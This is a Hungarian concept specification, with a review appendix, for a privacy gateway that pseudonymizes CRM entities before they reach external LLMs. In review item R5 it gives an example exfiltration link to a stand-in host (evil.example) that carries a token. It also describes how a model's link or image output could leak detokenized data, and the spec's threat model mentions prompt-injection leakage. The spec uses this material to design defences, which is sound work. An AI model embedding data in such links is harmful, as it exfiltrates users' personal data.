# AI Privacy Gateway — koncepcióspecifikáció

**Tokenizációs és detokenizációs réteg külső LLM-ek felé irányuló adatfolyamokhoz**

| | |
|---|---|
| **Verzió** | v0.1 (forrás: `ai_privacy_gateway_specification_hu.html`) + A. melléklet: review-javaslatok (v0.2, **jóváhagyásra vár**) |
| **Státusz** | koncepció — nem implementált |
| **Dátum** | 2026-08-19 |
| **Kapcsolódó** | `docs/AI-Agent-Platform-Feature-Spec-Sensitivity-Router.md`, `docs/specs/sensitivity-router-redesign-spec.md`, issue #189 |
| **Érintett kód** | `app/src/domain/gateway/model-gateway.ts`, `app/src/domain/gateway/sensitivity-router.ts`, `app/src/domain/tool-broker/`, `app/src/domain/agent/chat-tool-loop.ts`, `app/src/domain/channel/` |

**Cél:** a modellek és modellüzemeltetők felé történő érzékeny adatkitettség érdemi csökkentése úgy, hogy az AI agentek használhatósága és üzleti kontextusa a lehető legnagyobb mértékben megmaradjon.

> **Olvasási sorrend:** az §1–18 a beérkezett koncepció (v0.1) változatlan tartalma. Az **A. melléklet** tartalmazza a review-t: a javasolt módosításokat (R1–R23) és a nyitott döntéseket (D1–D6). Az A. melléklet elfogadott pontjai kerülnek majd a v0.2 törzsszövegbe.

---

## 1. Cél és alapfilozófia

A rendszer nem teljes anonimizálást és nem új access-control réteget kíván létrehozni. A privacy boundary az AI Agent Platform megbízható környezete és a külső LLM között húzódik.

> **Alapelv:** a tokenizáció azt szabályozza, hogy az LLM mit láthat; nem azt, hogy a felhasználó mit láthat.

A user, a forrásalkalmazások, az AI Agent Platform, a token vault és a platform normál infrastruktúrája trusted zone. A külső LLM/API szolgáltató a privacy boundary túloldalán van.

A megoldás kockázatcsökkentő, best-effort rendszer. Nem ígéri, hogy egy LLM soha semmilyen azonosítható adatot nem láthat, hanem determinisztikusan védi azt, amiről a rendszer strukturálisan tudja, hogy védendő, és best-effort védi a bizonytalan, szabad szöveges eseteket.

## 2. Fő architektúra

```
User / Source Systems
        │
        ▼
Trusted AI Agent Platform
  ├─ Connector / Privacy Interface
  ├─ Entity Resolver (best effort)
  ├─ Privacy Policy Engine
  ├─ Token Engine
  ├─ Token Vault / KMS
  └─ LLM Privacy Gateway
        │  raw → tokenized
        ▼
     External LLM
        │  tokenized response
        ▼
Trusted Platform
        │  tokenized → raw
        ▼
User / Application UI
```

A tokenizáció mechanikája platformszintű. A forrásrendszer domain tudást, mezőszintű privacy metadata-t, stabil belső azonosítókat és – ahol támogatott – entity resolution képességet ad.

## 3. Felelősségi határok

| Komponens | Felelősség |
|---|---|
| AI Agent Platform | Tokenformátum, tokenképzés, felismerés, validáció, scope, vault/KMS, LLM-bound adatfolyamok privacy transzformációja, detokenizáció vezérlése. |
| Forrásrendszer / connector | Megjelöli a védendő strukturált mezőket, entitástípust és stabil source ID-t; opcionálisan entity resolutiont és privacy hint-eket biztosít. |
| Forrásalkalmazás | Saját felhasználói jogosultságai és access control. Ezt a privacy gateway nem duplikálja. |
| LLM | Opaque tokenekkel dolgozik; nem kap detokenizációs képességet. |
| UI | A trusted oldalon a felhasználónak valódi adatot jeleníthet meg, és opcionálisan vizualizálja a privacy transzformációt. |

## 4. Tokenmodell

- A token nem hordozza visszafejthető formában az eredeti adatot; opaque azonosító.
- Formátuma egyértelműen felismerhető és verziózható, például `[[AITOK:v1:COMPANY:X7K2...]]`.
- A platform validálja, hogy egy LLM által visszaadott token valóban létező, hiteles token-e; a modell által „kitalált" token nem oldható fel.
- A belső entitásazonosság lehet tartós, de az LLM felé adott token alapértelmezésben conversation-scoped.
- Ugyanaz az entitás külön beszélgetésekben eltérő külső tokent kaphat, csökkentve a beszélgetések közötti korrelálhatóságot.
- A mapping hosszú ideig megőrizhető, hogy régi beszélgetések újranyitásakor a tokenek továbbra is feloldhatók legyenek.

### Vault és kulcskezelés

Első verzióban platformoldali vault/KMS javasolt, tenantonkénti erős izolációval. Későbbi enterprise opció lehet ügyfél- vagy forrásoldali kulcskezelés.

## 5. Strukturált adatok tokenizálása

Ez a legerősebb, determinisztikus védelmi réteg. A connector sémája jelzi, mely mezőket kell tokenizálni.

```json
{
  "company_name": {
    "privacy": "tokenize",
    "entity_type": "company",
    "source_id": "crm/company/4821"
  },
  "revenue": {
    "privacy": "pass"
  }
}
```

A tool response még az LLM contextbe kerülés előtt áthalad a privacy gateway-en. A védendő mezők értéke helyett token kerül a modellhez, miközben a feladathoz szükséges nem védett üzleti adatok – például forgalmi számok – megmaradhatnak.

## 6. Szabad szöveg kezelése

Három egymásra épülő szint:

1. **Schema-based tokenization:** strukturált mezőknél determinisztikus.
2. **Known-value substitution:** ha egy strukturált mezőből már ismert egy védett érték, ugyanazon adatcsomag szabad szövegében is lecserélhető.
3. **NER/privacy scanner:** e-mail, note, dokumentumszöveg stb. esetén best-effort felismerés (pl. e-mail, telefon, személynév).

A harmadik szint hibája alapértelmezésben nem állítja meg a workflow-t. A cél a kitettség csökkentése, nem a használhatóság feláldozása.

## 7. User input és entity resolution

A CRM-specializált agentnél indokolt, hogy a privacy resolver alapértelmezetten fusson. A prompt előtti entity recognition azonban best-effort.

Példa: *„Készíts kimutatást a SPAR idei forgalmáról."*

- Ha a resolver nagy bizonyossággal felismeri az entitást, a platform még az LLM előtt tokenre cseréli.
- A platform nem tart fenn minden connector minden entitásához globális alias-adatbázist.
- A platform candidate extractiont végezhet, a tényleges feloldást pedig a forrásrendszer/connector `resolve()` interfésze végzi.
- Ha a prompt előtti felismerés sikertelen, a nyers név továbbmehet az LLM-hez. Ez elfogadott best-effort leakage.

### Második védelmi vonal: tool boundary

Ha az LLM később strukturált tool callban használja a nevet, például `get_revenue(company="SPAR")`, a platform újra megkísérli a forrásoldali feloldást. Siker esetén a tool művelet stabil source ID-val történik, és a beszélgetés további részében már token használható.

> **Szabály:** user-input tokenizáció = best effort; strukturált tool-output tokenizáció = mandatory/deterministic, amennyiben a connector megfelelő privacy metadata-t biztosít.

## 8. Detokenizáció

Az LLM saját maga számára soha nem kérhet nyers értéket. A detokenizáció a trusted platform oldalon történik, tipikusan a végső UI/output rendereléskor.

Nem épül külön token-access-control rendszer. Ha a felhasználó a forrásalkalmazás normál jogosultsági modellje szerint hozzáfér az adathoz, a token a számára feloldható. A privacy gateway nem másolja le a CRM vagy más source system jogosultsági rendszerét.

## 9. Privacy Interface Contract csatlakoztatott rendszerekhez

A platform szabványos privacy interfészt definiál. A connectorok capability-alapon implementálhatják.

### Elvárt / ajánlott képességek

- Védendő strukturált mezők deklarálása.
- Entitástípus megadása: pl. `company`, `person`, `email`, `phone`, `account`.
- Stabil belső/source azonosító biztosítása.
- Opcionális privacy metadata és free-text hint-ek.
- Opcionális `resolve(text, entity_type?)` interface, amely találatot, több találatot vagy nincs találat eredményt ad.
- A tool API-k lehetőség szerint belső ID-val dolgozzanak, ne megjelenítési névvel.

### Capability deklaráció

```json
{
  "structured_field_privacy": true,
  "stable_entity_ids": true,
  "entity_resolution": true,
  "free_text_hints": false
}
```

Legacy vagy külső connector privacy interface nélkül is működhet, de a platform kisebb védelmi szintet jelez. A saját CRM lehet a teljes contract referenciaimplementációja.

## 10. Minden LLM-bound adatfolyam közös gateway-en

A privacy mechanizmus nem csak a normál agent contextre vonatkozik. Bármely adatfolyam, amely külső LLM-hez kerül, ugyanazon privacy gateway-en halad át.

- Agent prompt/context
- Tool response
- Debugging trace és log projection
- AI-alapú hibakeresés
- Későbbi evaluation vagy elemző workflow-k

A platform megtarthat teljes, nyers logokat a trusted zónában. Ha azonban egy debugging AI elemzi őket, egy `get_debug_trace()`-szerű API tokenizált projectiont ad az LLM számára. Nem szükséges külön privacy-log adatbázist fenntartani.

Egy trace-en belül ugyanaz az entitás konzisztensen ugyanazt a tokent kapja, hogy a debugging modell követni tudja az eseményláncot.

## 11. Üzemmódok és rollout

A funkció könnyen ki- és bekapcsolható. Javasolt konfigurációs hierarchia:

- platform master switch;
- tenant/szervezet default;
- agent szintű override.

| Mód | Viselkedés |
|---|---|
| **OFF** | A privacy transzformáció nem fut. |
| **OBSERVE / DRY-RUN** | A rendszer megállapítja és logolja, mit tokenizálna, de az LLM-bound adatot nem módosítja. |
| **ENFORCE** | A konfigurált privacy transzformáció ténylegesen érvényesül. |

Ez lehetővé teszi a fokozatos pilotot, regressziótesztet és gyors visszaállást, ha a modul egy workflow-t akadályoz.

## 12. Privacy Observability és vizuális debugging

A UI opcionálisan megjelölheti azokat a természetes nyelvi részleteket, amelyek az LLM felé tokenizálva mentek vagy OBSERVE módban tokenizálva mentek volna.

- A user a valódi értéket látja, például „SPAR Magyarország".
- Szín/kiemelés jelzi a védett entitást.
- Hover vagy debug panel mutathatja az entitástípust és a transzformáció státuszát.
- Normál usernek nem szükséges a technikai token megjelenítése.

Admin/debug nézetben hasznos lánc:

```
Original input
   ↓
Privacy transformation
   ↓
Actual LLM input
   ↓
LLM output
   ↓
Detokenized user output
```

OBSERVE módban ez a felület alkalmas false positive és false negative esetek gyors felderítésére.

## 13. Hibakezelési alapelvek

- A rendszer lehetőleg degradálódjon, ne omoljon össze.
- A bizonytalan user-input felismerés ne okozzon folyamatos hibaüzeneteket.
- Nem létező vagy sérült token nem detokenizálható; a platform validálja és szükség esetén kontrolláltan újrapróbálhatja/korrigáltathatja a modell outputját.
- A strukturált, explicit módon védendő source mezők tokenizálásának hibája erősebb policy-t igényelhet, mint a best-effort NER hibája.
- A fail-open / fail-closed viselkedés később policy-szinten konfigurálható lehet, különösen magas biztonsági igényű tenantoknál.

## 14. Nem célok

- Teljes, visszafejthetetlen anonimizálás.
- A forrásrendszerek access-control modelljének lemásolása.
- Garancia arra, hogy semmilyen személyes vagy üzleti adat soha nem jut LLM-hez.
- Minden connector összes entitásának és aliasának központi platformoldali replikálása.
- Az üzletileg szükséges numerikus vagy kontextuális adatok automatikus elrejtése pusztán azért, mert érzékenyek lehetnek.

## 15. Biztonsági és termékállítás

A termék állítása nem az, hogy „az LLM nem kap adatot", hanem hogy **az LLM csak a feladat elvégzéséhez szükséges adatot kapja meg, miközben a konfigurált azonosító és érzékeny entitásadatok determinisztikusan vagy best-effort módon tokenizálhatók**.

Ez csökkenti egy modelloldali adatmegőrzés, incidens vagy jogosulatlan betekintés következményeit, miközben a pénzügyi, elemzési és operatív agent-workflow-khoz szükséges kontextus megtartható.

## 16. Javasolt implementációs sorrend

1. Token Engine + tokenformátum + validáció.
2. Tenant-isolated Token Vault és KMS integráció.
3. LLM Privacy Gateway közös ki-/bemeneti pipeline.
4. Privacy Interface Contract és CRM referenciaimplementáció.
5. Strukturált mezőszintű tokenizáció.
6. Detokenizáció és UI renderelés.
7. Conversation-scoped token mapping hosszú távú megőrzéssel.
8. User-input best-effort resolver + source-side `resolve()`.
9. Known-value substitution és free-text scanner.
10. OFF / OBSERVE / ENFORCE konfiguráció.
11. Privacy observability/debug UI.
12. AI-safe Debug Trace API ugyanazon privacy gateway használatával.

## 17. Még nyitott technikai döntések

- A konkrét tokenformátum, maximális hossz és verziózási stratégia.
- A vault fizikai technológiája, retention és garbage collection szabályai.
- Conversation törlés, source entity törlés és adatmegőrzési szabályok kapcsolata a mappingekkel.
- A candidate extraction első verziójának technológiája: szabályok, könnyű NER, lokális modell vagy kombináció.
- Confidence thresholdok és többértelmű entity resolution UX.
- Fail-open/fail-closed policy pontos konfigurációja.
- Connector privacy capability-k minimális kötelező szintje és verziózása.
- Mérőszámok: tokenizációs recall/precision, workflow failure rate, latency overhead, token validation errors.

## 18. Elfogadási kritériumok az első verzióhoz

- Egy privacy metadata-val jelölt strukturált mező nyers értéke ENFORCE módban nem kerül az LLM requestbe.
- Az LLM ugyanazt a tokent konzisztensen használhatja egy conversation/trace scope-on belül.
- A user a trusted UI-ban detokenizált, természetes outputot kap.
- Az LLM nem rendelkezik olyan tool-lal, amely saját contextje számára nyers tokenértéket ad vissza.
- OBSERVE módban a rendszer a workflow módosítása nélkül megmutatja, mit tokenizált volna.
- Agentenként ki-/bekapcsolható a funkció.
- AI debugging esetén a raw log helyett tokenizált projection küldhető az LLM-nek.
- Privacy Interface nélküli connector továbbra is használható, de a platform egyértelműen alacsonyabb privacy capability-t kezel.

---

# A. melléklet — Review és javasolt módosítások (v0.2 tervezet, jóváhagyásra vár)

A review a v0.1 koncepciót a platform **jelenlegi kódjához** mérte. A javaslatok jelölése:
`[BLOKKOLÓ]` = implementáció előtt tisztázandó, különben rossz architektúrához vezet · `[FONTOS]` = a v1 hatókörét vagy biztonságát érdemben javítja · `[PONTOSÍTÁS]` = megfogalmazás/összhang.

## A.0 Kiindulás: mi van már ma a kódban

A spec zöldmezős rendszerként ír le egy privacy-réteget, de a platformban **már fut egy privacy-döntéspont** ugyanazon a hívásláncon:

| Meglévő elem | Hol | Mit csinál ma |
|---|---|---|
| `inspectPromptSensitivity` / `classifyPrompt` | `app/src/domain/gateway/sensitivity-router.ts` | determinisztikus, regex+checksum (Luhn, IBAN mod-97) osztályozás: `clean` / `sensitive` / `forbidden`, pozícióval és maszkolt snippettel |
| Policy-végrehajtás | `app/src/domain/gateway/model-gateway.ts` | `sensitive` → helyi modellre kényszerít (ma fail-closed, ha nincs helyi modell); `forbidden` → blokk + `model.call.denied` audit + emberi override |
| Per-agent felmentés | `agents.allow_sensitive_external_model` | mindent-vagy-semmit kapcsoló, csak a `sensitive` szintre |
| Kimenő redakció | `redactSensitiveText`, `StreamingSensitiveTextRedactor` | reasoning-trace és debug-export maszkolása (**egyirányú**, nem visszafejthető) |
| Nyitott átdolgozás | `docs/specs/sensitivity-router-redesign-spec.md` | kategória-szintű policy, tenant-célmodell, admin UI, `system`-üzenetek kérdése |
| Rokon ötlet-issue | #189 | reverzibilis maszkolás a `SensitivityFinding` spanekre, futásidejű memóriában tartott leképezéssel |

**Következmény:** a Privacy Gateway nem új, párhuzamos réteg, hanem a meglévő sensitivity-router **negyedik policy-akciója**. Ezt a spec §1–2-ben ki kell mondani.

## A.1 Blokkoló pontosítások

### R1 `[BLOKKOLÓ]` Viszony a meglévő sensitivity routerhez

Javaslat: a policy kategóriánként (`email`, `person`, `company`, `taj`, `adoszam`, `pan`, `iban`, `secret_key`, …) egy akciót ad:

```
allow | tokenize | local_only | block
```

Sorrend a gateway-ben: **tokenizáció fut előbb**, az osztályozó a már tokenizált szövegen dönt. Ennek két haszna van:
1. nem keletkezik két, egymással versengő privacy-döntéspont;
2. megoldja a redesign-spec P5 UX-problémáját (egyetlen e-mail-cím ma véglegesen „sensitive"-be billenti a beszélgetést; tokenizálva már nem).

A `secret_key` (privát kulcs, API token) **soha nem tokenizálható** — ott a maszkolásnak nincs üzleti értelme, marad `block`.

### R2 `[BLOKKOLÓ]` A vault kétféle tokent tároljon, ne egy PII-másolatot

A v0.1 „token vault"-ja implicit egy **második másolatot** hoz létre a személyes adatból. Javaslat:

| Token-osztály | Mit tárol | Mikor |
|---|---|---|
| **ref-token** | csak `(tenantId, connectorId, entityType, sourceId)` referencia — **nyers érték nélkül** | ha a connector ad stabil source ID-t (§5 fő eset) |
| **val-token** | titkosított értékmásolat (tenant-kulcs, per-conversation adatkulcs) | csak ha nincs source ID (szabad szöveges NER-találat) |

Haszon: a ref-token nem növeli a PII-felületet, és a forrásoldali törlés automatikusan átüt a detokenizáláson (GDPR-törlési jog). A val-token per-conversation adatkulccsal **crypto-shredding**-gel törölhető.

### R3 `[BLOKKOLÓ]` Hiányzik a detokenizáció a tool-hívás irányában

A §8 csak a felhasználó felé mutató detokenizációt írja le. De ha az LLM tool callban adja vissza a tokent — `get_revenue(company="[[AITOK:v1:COMPANY:X7K2]]")` —, akkor a platformnak a connector-hívás **előtt**, szerveroldalon fel kell oldania. Enélkül minden tokenizált entitáson elhasal a tool-hívás.

Javasolt invariáns: **detokenizáció pontosan két helyen történhet** — (1) tool-argumentum feloldás a Tool Brokerben (`ToolBrokerService.invoke` előtt), (2) végső renderelés a trusted felületen. Sehol máshol, és soha nem az LLM kérésére.

### R4 `[BLOKKOLÓ]` „Trusted UI" ma nem az egyetlen kimenet

A spec a detokenizációt a „trusted UI"-hoz köti, a platform azonban más csatornákon is kiad szöveget: **Telegram-csatorna** (`app/src/domain/channel/`), platform e-mail-értesítés, ticket-komment, riport/export fájl, debug-log export. Ezek egy része a bizalmi határon **kívülre** megy.

Javaslat: per-egress detokenizációs mátrix, alapértelmezettekkel:

| Egress | Detokenizáció |
|---|---|
| Web UI (bejelentkezett, tenant-scope) | teljes |
| Telegram / külső csatorna | policy szerint, alapból **nem** (vagy csak `company` szintű, `person`/`email` nem) |
| Platform e-mail-értesítés | alapból nem |
| Export / riport fájl | policy szerint, auditált |
| Debug-log export | soha |

### R5 `[BLOKKOLÓ]` Detokenizációs exfiltráció renderelés közben

Ha a modell a tokent URL-be, kép-hivatkozásba vagy linkbe ágyazza (`https://evil.example/?c=[[AITOK:...]]`), a naiv „cseréld vissza a végén" logika a **nyers értéket teszi be egy aktív linkbe** — a felhasználó kattintása vagy egy auto-betöltő kép kiviszi az adatot. Ez a tokenizáció bevezetésével keletkező **új** támadási út.

Szabály: detokenizáció csak szöveg-node-ban; URL-ben, markdown-link célban, HTML-attribútumban és kódblokkban a token **jelölve marad** (vagy a válasz megjelölésre kerül). A markdown-renderelő sanitizálása előfeltétel.

### R6 `[FONTOS]` Ütközés a tool-output contract runtime-mal

A platformnak van szigorú tool-output validációja (`app/src/domain/contract-runtime/`). Egy `email` formátumú mezőbe tett `[[AITOK:…]]` **elbukik a séma-validáción**, illetve elronthatja a downstream JSON-parszolást.

Javaslat: a tokenizáció a contract-validáció **után**, közvetlenül a modell-hívás előtt fusson; a contract-runtime a tokenizált mezőkre formátum-constraintet ne kényszerítsen; a token mindig string-mezőben marad (numerikus/dátum mezőt nem tokenizálunk — ott `pass` vagy `block`).

### R7 `[FONTOS]` Prompt-cache interakció

A platform prompt cache-t és cache-breakpointokat használ (`prompt-cache.ts`, két meglévő feature-spec). Conversation-scoped token + megosztott, cache-elt prefix (skill-szöveg, memória-blokk) együtt cache-szennyezést és rossz feloldást okoz.

Invariáns: tokenizált tartalom **csak a cache-határ utáni, nem megosztott szegmensbe** kerülhet.

### R8 `[FONTOS]` Streaming detokenizáció

A válasz SSE-deltákban érkezik, a token karakterei **több delta között szétszakadhatnak** — ugyanaz a probléma, amit a `StreamingSensitiveTextRedactor` már megold puffereléssel. A detokenizálónak ugyanezt a mintát kell követnie (lookahead a token-nyitó `[[`-ra, teljes token-határig visszatartás), különben töredék tokenek jelennek meg a felhasználónak.

## A.2 Architektúra- és tartalmi javaslatok

### R9 `[FONTOS]` Opaque token helyett típusos, rövid pszeudonim

A `[[AITOK:v1:COMPANY:X7K2...]]` három bajt okoz: (a) a modell elveszíti az entitás szemantikáját (hogy a „SPAR" kiskereskedelmi lánc), (b) a véletlen karakterlánc sok BPE-tokent eszik (költség + kontextus), (c) rontja az olvashatóságot a debug-nézetben.

Javaslat: **`[[COMPANY_1]]`, `[[PERSON_2]]`** típus + beszélgetésen belüli sorszám, a hitelesség HMAC-cel a vault oldalán ellenőrizve (nem a token szövegében). Opcionális, policy-vezérelt „kontextus-hint" (`COMPANY_1 = kiskereskedelmi lánc, HU`) — ez tudatos csere: kicsit több kontextus-szivárgás jobb válaszminőségért. → **D1**

### R10 `[FONTOS]` Token-hitelesség és névtér

Definiálandó: `(tenantId, conversationId, entityRef) → surrogate` bijektív; a feloldás kulcsa a surrogate + conversation scope. A „modell által kitalált token nem oldható fel" (§4) csak akkor teljesül, ha a feloldás **kizárólag a vault-találaton** múlik (nem a token alakján), és a nem talált token audit-eseményt ír (`privacy.token.unknown`).

### R11 `[FONTOS]` Magyar nyelvi illesztés a known-value substitutionnél

A §6/2. szint exact-matchnek tűnik, de magyarul az entitásnév ragozódik: *SPAR-nak, SPAR-ral, Sparnál, a Sparban*. A v1-hez javasolt: normalizált (ékezet- és kisbetű-tűrő) illesztés + toldalék-tolerancia, Aho–Corasick szótár-illesztéssel a tenant entitásnevein. **ML-alapú NER nélkül** — ez determinisztikus, olcsó és auditálható, összhangban a Sensitivity-Router spec „nulla LLM-token" elvével. → **D4**

### R12 `[FONTOS]` Latency- és méret-korlátok

A tokenizáció a kritikus úton van, nagy tool-válaszoknál (több ezer soros CRM-lista) érzékelhető. Javasolt célérték a specbe: **p95 ≤ 50 ms / 100 KB szöveg**, batch vault-írás fordulónként egy tranzakcióban, és timeout-szabály:

- strukturált, jelölt mező → **fail-closed** (inkább hibázzon a hívás, mint hogy nyersen menjen ki),
- szabad szöveges scanner → **fail-open** + audit.

Ez konkretizálja a §13 utolsó pontját és a §17 fail-open kérdését.

### R13 `[FONTOS]` GDPR-megfogalmazás (a §15 jogilag pontatlan)

A tokenizáció **pszeudonimizálás** (GDPR 4. cikk 5. pont), nem anonimizálás: a tokenizált adat **továbbra is személyes adat**, a mapping pedig a „kiegészítő információ", amit elkülönítve és védve kell tartani. Az LLM-szolgáltatóval kötött adatfeldolgozói szerződés (DPA) és a rekord-nyilvántartás **nem váltható ki** ezzel a réteggel — a tokenizáció a *kockázatot* csökkenti, nem a jogalapot.

A §15 javasolt szövege: „…a személyes adatok pszeudonimizált formában kerülnek a külső modellhez; ez a GDPR 32. cikke szerinti megfelelő technikai intézkedés, nem anonimizálás."

### R14 `[FONTOS]` A „nincs token-access-control" technikai minimuma

A §8 termékdöntése rendben van, de kell egy technikai minimum-invariáns, különben a token IDOR-szerű oldalút lesz: feloldás **csak** (a) azonos tenant, (b) azonos conversation/trace scope, (c) a kérő felhasználó a beszélgetés jogosult résztvevője esetén. Vagyis: nem építünk új jogosultsági modellt, de a vault-lookup nem lehet globálisan címezhető.

### R15 `[FONTOS]` Retention és törlés a meglévő modellekre kötve

A §17 nyitott kérdése megválaszolható a már meglévő sémával: `RetentionPolicy`, `Conversation.retainUntil`, `Conversation.legalHold`, `Message.contentDeletedAt`. Javaslat: a mapping élettartama a beszélgetés retention-jét kövesse; beszélgetés törlésekor a per-conversation adatkulcs törlődik (crypto-shredding) → a val-tokenek visszafejthetetlenné válnak, a ref-tokenek pedig eleve nem tárolnak értéket.

### R16 `[PONTOSÍTÁS]` Terminológia: a „token" szó foglalt

A kódbázisban a „token" már négy dolgot jelent (LLM-token / `model_calls.prompt_tokens`, `WriteGateToken`, `ChannelLinkToken`, OAuth-token). Javaslat: a privacy-oldali entitás neve **surrogate** (magyarul „álnév"), a leképezés `surrogate_map`, a modul `privacy-surrogate`. Most olcsó átnevezni, később drága.

### R17 `[PONTOSÍTÁS]` Nem szöveges modalitások explicit scope-ja

A platform PDF-et és képet is küld a modellnek (chat-csatolmány, tulajdoni lap feldolgozás). Ezekre a szöveges tokenizáció nem működik. A spec §14 (Nem célok) egészüljön ki: „csatolmányok (PDF, kép) tartalmának tokenizálása nem cél a v1-ben; ezekre a meglévő sensitivity-policy (blokk / jóváhagyás) marad érvényben." → **D5**

### R18 `[PONTOSÍTÁS]` Tárolás nyersen, tokenizáció a határon

Ki kell mondani, hogy a `messages` / tool-call rekordok a trusted zónában **nyersen** tárolódnak, és a tokenizáció minden fordulóban a kimenő határon fut újra (entitástérkép-cache-sel). Ez a következetes olvasata a §10-nek („a platform megtarthat teljes, nyers logokat"), és elkerüli, hogy a tárolt előzmény tokenizált, feloldhatatlan formában ragadjon be.

### R19 `[PONTOSÍTÁS]` Idempotencia újrafuttatásnál

A leképezés **perzisztens** legyen, ne csak futásidejű memóriában (szemben a #189 javaslatával): a ticket-retry, agent-turn resilience és a beszélgetés újranyitása ugyanazt a surrogate-ot kell hogy adja ugyanarra az entitásra, különben az előzményben lévő korábbi surrogate-ok feloldhatatlanná válnak.

### R20 `[PONTOSÍTÁS]` Komponensnevek a valós modulokra mutassanak

A §2 ábra fantázianevei helyett a meglévő modulokra érdemes hivatkozni: `ModelGateway.call()`, `ToolBrokerService.invoke()`, `chat-tool-loop`, `channel-*` adapterek, `contract-runtime`. Így a spec olvasható marad fejlesztőnek is.

### R21 `[FONTOS]` Hiányzó fejezet: fenyegetésmodell és maradékkockázat

A spec nem mondja ki, **mi ellen** véd. Javasolt új fejezet:

- **Véd:** modellszolgáltatói adatmegőrzés/tréning-felhasználás, szolgáltatói incidens vagy jogosulatlan betekintés, subprocesszor-lánc, log-kiszivárgás a modell oldalán.
- **Nem véd:** prompt injection általi kontextus-kiszivárgás (a modell a nála lévő tokenizált adatot bármikor kiadhatja — de az tokenizált), aggregált újraazonosítás (a §5 szerint bent maradó forgalmi számok + iparág + időszak együtt azonosíthat egy céget), a felhasználó saját, tudatos adatbeírása, a nem tokenizált szabad szöveg (best-effort réteg).
- **Maradékkockázat:** a §7 szerint elfogadott user-input leakage; ezt üzletileg is vállalni kell.

### R22 `[FONTOS]` Mérhető elfogadási kritériumok

A §18 kritériumai jók, de nem mérhetők. Javasolt kiegészítés (a meglévő `Eval` / `EvalRun` és `prompt-eval-red-lines` keretre építve):

| Metrika | Cél v1-ben |
|---|---|
| Strukturált, jelölt mező recall | 100% (definíció szerinti, teszttel bizonyítva) |
| Szabad szöveges recall (címkézett magyar mintán) | ≥ 80% |
| False positive ráta (tokenizált, de nem védendő) | ≤ 5% |
| Latency overhead (p95, teljes forduló) | ≤ 80 ms |
| Workflow failure rate változása OBSERVE→ENFORCE | ≤ +1% |
| Válaszminőség-romlás tokenizált prompton (eval-szett) | ≤ 5% |

Az utolsó sor fontos: **a tokenizáció ronthatja a modell válaszminőségét**, ezt mérni kell, nem feltételezni.

### R23 `[FONTOS]` Vertikális MVP a §16 sorrend helyett

A javasolt 1–3. lépés (Token Engine, vault, pipeline) önmagában nem szállít demózható értéket. Javaslat: **vékony, végponttól végpontig futó szelet** először —

**M1 (vertikális MVP):** saját CRM connector + **egyetlen entitástípus (`company`)** + strukturált tool-output tokenizáció + tool-arg detokenizáció + web UI detokenizáció + OBSERVE mód + audit. Egy agenten, egy tenanton.
**M2:** kategória-policy (allow/tokenize/local_only/block) + ENFORCE + admin UI + a sensitivity-router összevonás (R1).
**M3:** known-value substitution + magyar illesztés + user-input resolver + `resolve()` contract.
**M4:** debug-trace projection, observability UI, csatorna-mátrix (R4), több connector.

## A.3 Nyitott döntések (ezekre kérek választ)

| # | Kérdés | Opciók | Javaslatom |
|---|---|---|---|
| **D1** | Opaque token vagy típusos pszeudonim + kontextus-hint? | (a) `[[AITOK:v1:COMPANY:X7K2]]` (b) `[[COMPANY_1]]` (c) `[[COMPANY_1]]` + típus-hint | (b), a hint opcionálisan policy-vel |
| **D2** | A vault referenciát tárol vagy titkosított értéket? | (a) csak érték (b) csak referencia (c) kettős (R2) | (c) |
| **D3** | Külső csatornán (Telegram, e-mail) detokenizálunk? | (a) igen (b) nem (c) entitástípusonként | (c), alapból „nem" a `person`/`email` típusra |
| **D4** | A memória-chunkok (ma `system` üzenetként injektálva, a redesign-spec P4/D3-a) tokenizálódnak? | (a) igen (b) nem (c) csak ENFORCE-ban | (a) — különben marad a mai osztályozatlan rés |
| **D5** | v1 hatókör: csak saját CRM + `company`? | (a) igen (R23/M1) (b) több entitástípus rögtön | (a) |
| **D6** | Az issue #189 (reverzibilis maszkolás) beolvad ebbe, vagy külön él tovább? | (a) beolvad (b) marad külön, mint a regex-alapú útvonal | (a) — #189 a val-token speciális esete |
